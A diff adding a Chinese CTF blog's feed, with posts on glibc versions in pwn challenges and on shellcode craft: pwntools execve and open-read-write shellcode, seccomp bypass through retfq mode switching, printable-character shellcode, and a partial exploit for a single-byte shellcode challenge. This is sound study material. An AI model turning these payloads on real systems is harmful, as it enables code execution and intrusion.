@@ -1,0 +1,2850 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-09-06T10:39:38+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Surager</title><subtitle>19计算机专业在读&lt;br/&gt;
+Blue-Whale&lt;br/&gt;
+V&amp;N&lt;br/&gt;
+龙鸣PWN手&lt;br/&gt;
+希望你能在这里学到东西&lt;br/&gt;
+&lt;a href=&quot;mailto:surager2019@gmail.com&quot;&gt;
+  &lt;i class=&quot;fas fa-envelope&quot;&gt;&lt;/i&gt;
+&lt;/a&gt;
+&lt;a href=&quot;https://github.com/Surager&quot;&gt;
+  &lt;i class=&quot;fab fa-github&quot;&gt;&lt;/i&gt;
+&lt;/a&gt;
+&lt;a href=&quot;https://surager.pub/feed.xml&quot;&gt;
+  &lt;i class=&quot;fas fa-rss&quot;&gt;&lt;/i&gt;
+&lt;/a&gt;
+&lt;iframe 
+  frameborder=&quot;no&quot; 
+  border=&quot;0&quot; 
+  marginwidth=&quot;0&quot; 
+  marginheight=&quot;0&quot; 
+  width=100% 
+  height=52 
+  src=&quot;https://music.163.com/outchain/player?type=2&amp;id=1453894413&amp;auto=0&amp;height=32&quot;
+&gt;&lt;/iframe&gt;
+</subtitle><entry><title type="html">x86架构下pwn题目libc版本概述</title><link href="http://localhost:4000/_posts/2021-05-11-x86%E6%9E%B6%E6%9E%84%E4%B8%8Bpwn%E9%A2%98%E7%9B%AElibc%E6%A6%82%E8%BF%B0/" rel="alternate" type="text/html" title="x86架构下pwn题目libc版本概述" /><published>2021-05-11T00:00:00+08:00</published><updated>2021-05-11T00:00:00+08:00</updated><id>http://localhost:4000/_posts/x86%E6%9E%B6%E6%9E%84%E4%B8%8Bpwn%E9%A2%98%E7%9B%AElibc%E6%A6%82%E8%BF%B0</id><content type="html" xml:base="http://localhost:4000/_posts/2021-05-11-x86%E6%9E%B6%E6%9E%84%E4%B8%8Bpwn%E9%A2%98%E7%9B%AElibc%E6%A6%82%E8%BF%B0/">&lt;h1 id=&quot;x86架构下pwn题目libc版本概述&quot;&gt;x86架构下pwn题目libc版本概述&lt;/h1&gt;
+
+&lt;p&gt;鉴于最近关于 libc 的讨论又开始兴起，在此稍作总结。&lt;/p&gt;
+
+&lt;p&gt;关于什么是 libc ：&lt;a href=&quot;https://zh.wikipedia.org/zh-cn/GNU_C%E5%87%BD%E5%BC%8F%E5%BA%AB&quot;&gt;GNU C库&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;libc版本&quot;&gt;libc版本&lt;/h2&gt;
+
+&lt;h3 id=&quot;如何查看&quot;&gt;如何查看&lt;/h3&gt;
+
+&lt;p&gt;一种方法是直接运行 libc。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;$ /lib/x86_64-linux-gnu/libc-2.27.so
+GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.4) stable release version 2.27.
+Copyright (C) 2018 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.
+There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
+PARTICULAR PURPOSE.
+Compiled by GNU CC version 7.5.0.
+libc ABIs: UNIQUE IFUNC
+For bug reporting instructions, please see:
+&amp;lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&amp;gt;.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;另一种是 strings 加 grep&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;$ strings /lib/x86_64-linux-gnu/libc-2.27.so | grep GNU
+GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.4) stable release version 2.27.
+Compiled by GNU CC version 7.5.0.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;大版本&quot;&gt;大版本&lt;/h3&gt;
+
+&lt;p&gt;在一般情况下，主流的 ubuntu 运行的 libc 大版本如下：（截至2021-05-13）&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;ubuntu版本&lt;/th&gt;
+      &lt;th&gt;libc版本&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;ubuntu 16.04 LTS&lt;/td&gt;
+      &lt;td&gt;2.23-0ubuntu&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;ubuntu 18.04 LTS&lt;/td&gt;
+      &lt;td&gt;2.27-3ubuntu&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;ubuntu 20.04 LTS&lt;/td&gt;
+      &lt;td&gt;2.31-0ubuntu&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h3 id=&quot;小版本&quot;&gt;小版本&lt;/h3&gt;
+
+&lt;p&gt;pwn 题目的搭建一般使用 docker。大多数出题人会在 Dockerfile 里面这么写：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-dockerfile&quot;&gt;RUN apt-get update &amp;amp;&amp;amp; apt-get -y dist-upgrade
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;此外还可能安装一些 &lt;code&gt;xinetd&lt;/code&gt; 之类的东西。这些操作都有可能将 libc 升级到目前大版本的最高小版本：&lt;/p&gt;
+
+&lt;p&gt;例如，截至 2021-05-13 版本如下：&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;ubuntu16.04 : 2.23-0ubuntu11.2&lt;/p&gt;
+
+  &lt;p&gt;ubuntu18.04: 2.27-3ubuntu1.4&lt;/p&gt;
+
+  &lt;p&gt;ubuntu20.04: 2.31-0ubuntu9.2&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;因此，常用版本一般是这三个。&lt;/p&gt;
+
+&lt;p&gt;我们可以在以下几个网站获取二进制文件：&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://launchpad.net/ubuntu&quot;&gt;https://launchpad.net/ubuntu&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://pkgs.org/download/libc6&quot;&gt;https://pkgs.org/download/libc6&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;也可以获取源码：&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ftp.gnu.org/gnu/glibc/&quot;&gt;https://ftp.gnu.org/gnu/glibc/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;下面对它们的特点进行概述：&lt;/p&gt;
+
+&lt;h3 id=&quot;223-0ubuntu112&quot;&gt;2.23-0ubuntu11.2&lt;/h3&gt;
+
+&lt;p&gt;因为 ubuntu 16.04 已经于 2021-04-30 停止支持，此 libc 成为 ubuntu16 libc-2.23.so 的最后一个版本，也是 ubuntu系统 heap 中没有 tcache 的最后一个版本。可利用的漏洞较后两个版本来说更多一些。&lt;/p&gt;
+
+&lt;h3 id=&quot;227-3ubuntu14&quot;&gt;2.27-3ubuntu1.4&lt;/h3&gt;
+
+&lt;p&gt;加入了 tcache。由于 tcache double free 的严重性，2.27-3ubuntu1.3 中加入了 key 机制。本版本保留了 2.27-3ubuntu1.3 加入的 key 机制。&lt;/p&gt;
+
+&lt;p&gt;所以想体验原生 tcache double free 的同学可以找到 1.2（版本名称 ubuntu 后面的数字，下同） 以及之前的 libc 进行体验。&lt;/p&gt;
+
+&lt;p&gt;这里给出一种不怎么好但是简单的解决方案：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;sudo apt install libc6=2.27-3ubuntu1.2
+sudo apt install libc-dev-bin=2.27-3ubuntu1.2
+sudo apt install libc6-dev=2.27-3ubuntu1.2
+sudo apt install libc6-dbg=2.27-3ubuntu1.2
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;小tips：buuoj 的 ubuntu18 靶机中使用的 libc 版本是 2.27-3ubuntu1&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;另外，2.27 大版本下可能用到的其他小版本，有&lt;code&gt;2.27-3ubuntu1&lt;/code&gt;、&lt;code&gt;2.27-3ubuntu1.2&lt;/code&gt;、&lt;code&gt;2.27-3ubuntu1.3&lt;/code&gt;。&lt;/p&gt;
+
+&lt;h3 id=&quot;231-0ubuntu92&quot;&gt;2.31-0ubuntu9.2&lt;/h3&gt;
+
+&lt;p&gt;在 tcache_entry 中 加入了 key。对 unsorted bin 检查巨多。极大地限制了堆块的利用。另外还能在 gcc 编译选项里面加入 cet 或者 🐏️ switch。很蛋疼。&lt;/p&gt;
+
+&lt;p&gt;cet（ida 7.5以下版本 PLT 解析失败）解决指路：&lt;a href=&quot;https://github.com/M4tsuri/ida_fxxk_cet&quot;&gt;M4tsuri/ida_fxxk_cet&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;另外，2.31 大版本下可能用到的其他小版本，有&lt;code&gt;2.31-0ubuntu9&lt;/code&gt;、&lt;code&gt;2.31-0ubuntu9.1&lt;/code&gt;。&lt;/p&gt;
+
+&lt;p&gt;所以，需要准备的 libc 并不多，准备个 8 个左右就够应付比赛了。&lt;/p&gt;
+
+&lt;h2 id=&quot;libc加载&quot;&gt;libc加载&lt;/h2&gt;
+
+&lt;p&gt;当一个动态链接的程序运行起来之后，libc 就会通过链接器 (ld) 加载到内存中，此时用户编写的二进制程序便能够调用其中的函数。在本地调试 pwn 题目时，默认加载的 libc 是本地的 libc。32 位 libc 目录为： &lt;code&gt;/lib/i386-linux-gnu/libc.so.6&lt;/code&gt; 或者 &lt;code&gt;/lib32/libc.so.6&lt;/code&gt; ，64 位 libc 目录为 &lt;code&gt;/lib/x86_64-linux-gnu/libc.so.6&lt;/code&gt;。而 &lt;code&gt;libc.so.6&lt;/code&gt; 是一个指向 &lt;code&gt;./libc-xxx.so&lt;/code&gt; 的一个软链接。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;lrwxrwxrwx 1 root root   12 Dec  8 00:38 libc.so.6 -&amp;gt; libc-2.27.so
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;所以&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;即使本地 exp 中写了&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;libc = ELF(&quot;./libc-xxx.so&quot;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;也是默认使用本机的 libc。验证如下（使用 &lt;code&gt;libc = ELF(&quot;./libc-xxx.so&quot;)&lt;/code&gt; 写脚本，之后进行 &lt;code&gt;gdb attach&lt;/code&gt;）：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; vmmap
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+    ...
+    0x562ccc0dc000     0x562ccc0fd000 rw-p    21000 0      [heap]
+    0x7f6ee40a3000     0x7f6ee428a000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
+    0x7f6ee428a000     0x7f6ee448a000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
+    0x7f6ee448a000     0x7f6ee448e000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
+    0x7f6ee448e000     0x7f6ee4490000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
+    0x7f6ee4490000     0x7f6ee4494000 rw-p     4000 0
+    0x7f6ee4494000     0x7f6ee44bd000 r-xp    29000 0      /lib/x86_64-linux-gnu/ld-2.27.so
+    0x7f6ee46a0000     0x7f6ee46a2000 rw-p     2000 0
+    0x7f6ee46bd000     0x7f6ee46be000 r--p     1000 29000  /lib/x86_64-linux-gnu/ld-2.27.so
+    0x7f6ee46be000     0x7f6ee46bf000 rw-p     1000 2a000  /lib/x86_64-linux-gnu/ld-2.27.so
+    ...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;原因一是 ELF 只是获取了目标 libc 的信息，并未进行加载。再者如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;$ ldd pwn
+	linux-vdso.so.1 (0x00007ffe7cf8a000)
+	libc.so.6 =&amp;gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f74a57b5000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007f74a5daa000)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;libc 和 ld 的路径已经默认写死在程序中了。&lt;/p&gt;
+
+&lt;p&gt;除非使用 ld 来运行程序&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;p = process(['./ld-xxx.so','./pwn'],env={&quot;LD_PRELOAD&quot;:&quot;./libc-xxx.so&quot;})
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;但是笔者和 某dai 亲测 &lt;code&gt;ld-2.23.so&lt;/code&gt; 并不好使。原因未知，推测是 2.23 版本有问题。&lt;/p&gt;
+
+&lt;p&gt;或者使用 &lt;code&gt;patchelf&lt;/code&gt; 来将写死的 libc 换成目标 libc，这里网上教程很多，不再赘述。&lt;/p&gt;
+
+&lt;h2 id=&quot;未解决如何判断远程-libc&quot;&gt;（未解决）如何判断远程 libc&lt;/h2&gt;
+
+&lt;p&gt;如果不给libc，全靠猜。&lt;/p&gt;
+
+&lt;p&gt;猜可以根据&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;泄露一个 libc 地址，然后查一下&lt;/li&gt;
+  &lt;li&gt;double free 一下看报错&lt;/li&gt;
+  &lt;li&gt;chunk 的个数限制&lt;/li&gt;
+  &lt;li&gt;题目的难度和白给程度&lt;/li&gt;
+  &lt;li&gt;seccomp 设了多少&lt;/li&gt;
+  &lt;li&gt;搁这挨个试&lt;/li&gt;
+&lt;/ol&gt;</content><author><name></name></author><category term="_posts" /><category term="binary" /><summary type="html">x86架构下pwn题目libc版本概述</summary></entry><entry><title type="html">shellcode 的 issue</title><link href="http://localhost:4000/_posts/2021-05-03-shellcode%E7%9A%84issue/" rel="alternate" type="text/html" title="shellcode 的 issue" /><published>2021-05-03T00:00:00+08:00</published><updated>2021-05-03T00:00:00+08:00</updated><id>http://localhost:4000/_posts/shellcode%E7%9A%84issue</id><content type="html" xml:base="http://localhost:4000/_posts/2021-05-03-shellcode%E7%9A%84issue/">&lt;blockquote&gt;
+  &lt;p&gt;本文章为个人笔记性质。如有错误，请多多指教。&lt;/p&gt;
+
+  &lt;p&gt;谐音梗。issue──&amp;gt;艺术&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;CSAPP 中 有一章专门讲了 Y86-64 这一指令集。Y86 指令中，前 4bit 是指令的类型，通过这一位我们可以判断指令的类型。之后通过一些翻译类型的题目，我感受到了指令的构成。并且通过这些指令初步感受到了各类指令所占空间的大小。正好前一段时间做过一道 shellcode 的题目，因此来研究一波。&lt;/p&gt;
+
+&lt;h2 id=&quot;从-pwntools-说起&quot;&gt;从 pwntools 说起&lt;/h2&gt;
+
+&lt;p&gt;i386 shellcraft.sh()&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt; 	/* execve(path='/bin///sh', argv=['sh'], envp=0) */
+    /* push '/bin///sh\x00' */
+    push 0x68
+    push 0x732f2f2f
+    push 0x6e69622f
+    mov ebx, esp
+    /* push argument array ['sh\x00'] */
+    /* push 'sh\x00\x00' */
+    push 0x1010101
+    xor dword ptr [esp], 0x1016972
+    xor ecx, ecx
+    push ecx /* null terminate */
+    push 4
+    pop ecx
+    add ecx, esp
+    push ecx /* 'sh\x00' */
+    mov ecx, esp
+    xor edx, edx
+    /* call execve() */
+    push SYS_execve /* 0xb */
+    pop eax
+    int 0x80
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;amd64 shellcraft.sh()&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt; 	/* execve(path='/bin///sh', argv=['sh'], envp=0) */
+    /* push '/bin///sh\x00' */
+    push 0x68
+    mov rax, 0x732f2f2f6e69622f
+    push rax
+    mov rdi, rsp
+    /* push argument array ['sh\x00'] */
+    /* push 'sh\x00' */
+    push 0x1010101 ^ 0x6873
+    xor dword ptr [rsp], 0x1010101
+    xor esi, esi /* 0 */
+    push rsi /* null terminate */
+    push 8
+    pop rsi
+    add rsi, rsp
+    push rsi /* 'sh\x00' */
+    mov rsi, rsp
+    xor edx, edx /* 0 */
+    /* call execve() */
+    push SYS_execve /* 0x3b */
+    pop rax
+    syscall
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这些都是 pwntools 自带的 shellcode。可以直接拿来用。如果不想直接使用这些，可以自行构造。&lt;/p&gt;
+
+&lt;p&gt;例如一些汇编指令类：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;shellcraft.push('rax')
+shellcraft.mov('eax', 'SYS_execve')
+shellcraft.xor(0xdeadbeef,'rsp',32)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;或者你想直接利用 Pwntools 来写 orw：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;shellcode = shellcraft.open('/flag')
+shellcode += shellcraft.read(0,'rsp',0x30)
+shellcode += shellcraft.write(1,'rsp',0x30)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;结果如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;    /* open(file='/flag', oflag=0, mode=0) */
+    /* push '/flag\x00' */
+    mov rax, 0x101010101010101
+    push rax
+    mov rax, 0x101010101010101 ^ 0x67616c662f
+    xor [rsp], rax
+    mov rdi, rsp
+    xor edx, edx /* 0 */
+    xor esi, esi /* 0 */
+    /* call open() */
+    push SYS_open /* 2 */
+    pop rax
+    syscall
+    /* call read(0, 'rsp', 0x30) */
+    xor eax, eax /* SYS_read */
+    xor edi, edi /* 0 */
+    push 0x30
+    pop rdx
+    mov rsi, rsp
+    syscall
+    /* write(fd=1, buf='rsp', n=0x30) */
+    push 1
+    pop rdi
+    push 0x30
+    pop rdx
+    mov rsi, rsp
+    /* call write() */
+    push SYS_write /* 1 */
+    pop rax
+    syscall
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这么一来，我们可以直接利用 pwntools 来进行常规 shellcode 的编写了。在没有进行 字符限制 的情况下，直接利用 &lt;code&gt;shellcraft&lt;/code&gt; 确实是很方便的方法。&lt;/p&gt;
+
+&lt;p&gt;如果遇到了禁用 &lt;code&gt;open&lt;/code&gt; 系统调用的题目，那一般会故意留一个 &lt;code&gt;ALLOW&lt;/code&gt; 的系统调用 &lt;code&gt;fstat&lt;/code&gt;。系统调用号为 5。但是在 32 位运行模式下 5 号系统调用是 &lt;code&gt;open&lt;/code&gt;。所以可以通过 &lt;code&gt;retfq&lt;/code&gt; 指令进行运行模式的转换，从而达到能够使用 &lt;code&gt;open&lt;/code&gt; 系统调用的效果：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;push retaddress
+push 0x23
+retfq
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;注意 retaddress 会被解析成 32 位的地址&lt;/p&gt;
+
+&lt;p&gt;重新回到 64 位运行模式的方法：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;jmp 0x33:retaddress
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;但是&quot;&gt;但是&lt;/h2&gt;
+
+&lt;p&gt;但是总有一些题目、一些出题人喜欢在题目里面塞💩️。那么如何限制 shellcode 呢？很简单无脑的一种方法就是限制输入的字符，如果力求模拟真实情况的话。例如：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;{
+    char buf[32];
+    read(0,buf,32);
+    for (int i=0;i&amp;lt;strlen(buf);i++){
+        if(buf[i] &amp;lt; 32 || buf[i] &amp;gt; 126) exit(-1);
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这样就直接可以限制输入的 shellcode 为可打印字符。考虑到这种情况，首先考虑我们需要的系统调用能不能用。&lt;code&gt;int 0x80&lt;/code&gt; 所对应的字节码是 &lt;code&gt;CD 80&lt;/code&gt;，明显不可打印；&lt;code&gt;syscall&lt;/code&gt;  对应的字节码是 &lt;code&gt;0F 05&lt;/code&gt; ，也是不可打印的。首先想到的是用指令在输入后对 shellcode 进行操作，使其变成对应的系统调用。例如：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;// gcc -g -m64 -z execstack -no-pie shellcode1.c -o shellcode1
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+
+int main() {
+    char buf[0x400];
+    int n, i;
+    n = read(0, buf, 0x400);
+    if (n &amp;lt;= 0) return 0;
+    for (i = 0; i &amp;lt; n; i++) {
+        if(buf[i] &amp;lt; 32 || buf[i] &amp;gt; 126) return 0;
+    }
+    ((void(*)(void))buf)();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;我们用 &lt;code&gt;sub byte ptr [rsi + 0x], dl&lt;/code&gt; 指令将两个可打印字符写成 &lt;code&gt;syscall&lt;/code&gt;。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;payload = asm(&quot;&quot;&quot;
+push 0x6f
+pop rdx
+push rbx
+push rbx
+push rbx
+push rsp
+pop rsi
+sub byte ptr [rsi+0x3e], dl
+sub byte ptr [rsi+0x3f], dl
+&quot;&quot;&quot;)
+payload += &quot;\x7e\x74&quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;此处用 &lt;code&gt;push&lt;/code&gt; 指令对栈的相对位置进行了调整。然后通过 &lt;code&gt;push pop&lt;/code&gt; 的组合来达到 &lt;code&gt;mov&lt;/code&gt; 的效果，最后计算位置，将 &lt;code&gt;\x7e\x74&lt;/code&gt; 转换成 &lt;code&gt;\x0f\x05&lt;/code&gt;。&lt;/p&gt;
+
+&lt;p&gt;效果：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;# 转换前
+0x7fff576dbb4e:	jle    0x7fff576dbbc4
+# 转换后
+0x7fff576dbb4e:	syscall
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;在 &lt;a href=&quot;https://xz.aliyun.com/t/6645&quot;&gt;shellcode的艺术&lt;/a&gt; 中有一段关于可打印字符 shellcode 的总结，这里抄录过来。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;1.数据传送:
+push/pop eax…
+pusha/popa
+
+2.算术运算:
+inc/dec eax…
+sub al, 立即数
+sub byte ptr [eax… + 立即数], al dl…
+sub byte ptr [eax… + 立即数], ah dh…
+sub dword ptr [eax… + 立即数], esi edi
+sub word ptr [eax… + 立即数], si di
+sub al dl…, byte ptr [eax… + 立即数]
+sub ah dh…, byte ptr [eax… + 立即数]
+sub esi edi, dword ptr [eax… + 立即数]
+sub si di, word ptr [eax… + 立即数]
+
+3.逻辑运算:
+and al, 立即数
+and dword ptr [eax… + 立即数], esi edi
+and word ptr [eax… + 立即数], si di
+and ah dh…, byte ptr [ecx edx… + 立即数]
+and esi edi, dword ptr [eax… + 立即数]
+and si di, word ptr [eax… + 立即数]
+
+xor al, 立即数
+xor byte ptr [eax… + 立即数], al dl…
+xor byte ptr [eax… + 立即数], ah dh…
+xor dword ptr [eax… + 立即数], esi edi
+xor word ptr [eax… + 立即数], si di
+xor al dl…, byte ptr [eax… + 立即数]
+xor ah dh…, byte ptr [eax… + 立即数]
+xor esi edi, dword ptr [eax… + 立即数]
+xor si di, word ptr [eax… + 立即数]
+
+4.比较指令:
+cmp al, 立即数
+cmp byte ptr [eax… + 立即数], al dl…
+cmp byte ptr [eax… + 立即数], ah dh…
+cmp dword ptr [eax… + 立即数], esi edi
+cmp word ptr [eax… + 立即数], si di
+cmp al dl…, byte ptr [eax… + 立即数]
+cmp ah dh…, byte ptr [eax… + 立即数]
+cmp esi edi, dword ptr [eax… + 立即数]
+cmp si di, word ptr [eax… + 立即数]
+
+5.转移指令:
+push 56h
+pop eax
+cmp al, 43h
+jnz lable
+
+&amp;lt;=&amp;gt; jmp lable
+
+6.交换al, ah
+push eax
+xor ah, byte ptr [esp] // ah ^= al
+xor byte ptr [esp], ah // al ^= ah
+xor ah, byte ptr [esp] // ah ^= al
+pop eax
+
+7.清零:
+push 44h
+pop eax
+sub al, 44h ; eax = 0
+
+push esi
+push esp
+pop eax
+xor [eax], esi ; esi = 0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;关于 sub, xor, and, cmp 部分，看似挺多，其实记住源操作数和目的操作数一个是 &lt;code&gt;byte ptr [reg + imm]&lt;/code&gt;，另一个是 寄存器 就行了。&lt;/p&gt;
+
+&lt;p&gt;在这个基础上，手写可打印 shellcode 是很简单的。(&lt;/p&gt;
+
+&lt;h2 id=&quot;单字节-shellcode&quot;&gt;单字节 shellcode&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;MRCTF2021 8bit_adventure 官方WP复现&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;假如我们在让用户输入 shellcode 时，让 shellcode 的每一个字节散乱地分布在一个区域内。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;s = mmap(0, 0x20000u, 7, 34, 0, 0);
+memset(s, 0x90, 0x20000u);
+
+*(s + i + rand() % 32) = input;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这样执行命令的时候只能执行单字节的 shellcode。&lt;/p&gt;
+
+&lt;p&gt;32 位运行模式下，对于&lt;code&gt;push&lt;/code&gt;、&lt;code&gt;pop&lt;/code&gt;、&lt;code&gt;inc&lt;/code&gt;、&lt;code&gt;dec&lt;/code&gt; 这种单操作数的指令，它们都是单字节的，可以使用。&lt;/p&gt;
+
+&lt;p&gt;本题给了一段后门。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;if ( v2 == 0xCDu )
+{
+    v1 = rand();
+    *(v1 % 31 + i) = 0xCDu;
+    *(v1 % 31 + 1 + i) = 0x80u;
+} // disasm(&quot;\xcd\x80&quot;) int    0x80
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;也就是说，我们可以用栈和全部寄存器通过系统调用进行 orw&lt;/p&gt;
+
+&lt;p&gt;由于本题有&lt;code&gt;close(0)&lt;/code&gt;，因此首先考虑怎么写 “flag” 字符串。受单字节 shellcode 限制，无法解引用。考虑用 pipe 做一个跳板，写 pipe 读 pipe 的方式。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;// demo.c
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;fcntl.h&amp;gt;
+
+int main(){
+    int fd_pipe[2];
+    char buf[0x30];
+    pipe(fd_pipe);
+    write(fd_pipe[1],&quot;f&quot;,1);
+    write(fd_pipe[1],&quot;l&quot;,1);
+    write(fd_pipe[1],&quot;a&quot;,1);
+    write(fd_pipe[1],&quot;g&quot;,1);
+    write(fd_pipe[1],&quot;\x00&quot;,1);
+    read(fd_pipe[0],buf,0x5);
+    int fd = open(buf,O_RDONLY);
+    read(fd,buf,0x30);
+    write(1,buf,0x30);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;我们用 &lt;code&gt;demo.c&lt;/code&gt; 成功 orw 出了 flag。&lt;/p&gt;
+
+&lt;p&gt;由此看来，只用 &lt;code&gt;push&lt;/code&gt;、&lt;code&gt;pop&lt;/code&gt;、&lt;code&gt;inc&lt;/code&gt;、&lt;code&gt;dec&lt;/code&gt; 完全可以完成 orw。&lt;/p&gt;
+
+&lt;p&gt;构造 exp:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from pwn import *
+import base64
+context.log_level='debug'
+
+sh=process('./8bit_adventure')
+
+payload = asm(&quot;&quot;&quot;
+pop edi
+push eax
+push ebx
+push ebx
+push ebx
+pop eax
+push esp
+pop ebx
+&quot;&quot;&quot;)+ \
+asm(&quot;inc eax&quot;)*42 + \
+&quot;\xcd&quot; # pipe(fd_stack)
+
+payload += asm(&quot;&quot;&quot;
+pop esi
+pop ebx
+&quot;&quot;&quot;)+\
+asm(&quot;&quot;&quot;
+dec edi
+&quot;&quot;&quot;)*0x5c5+\
+asm(&quot;&quot;&quot;
+push edi
+pop ecx
+inc edx
+inc eax
+inc eax
+inc eax
+inc eax
+&quot;&quot;&quot;)+\
+&quot;\xcd&quot; # write(fd_pipe[1],&quot;f&quot;,1)
+
+payload += asm(&quot;&quot;&quot;
+inc ecx
+inc ecx
+inc ecx
+inc eax
+inc eax
+inc eax
+&quot;&quot;&quot;)+\
+&quot;\xcd&quot; # write(fd_pipe[1],&quot;l&quot;,1)
+
+payload += asm(&quot;&quot;&quot;
+dec ecx
+dec ecx
+inc eax
+inc eax
+inc eax
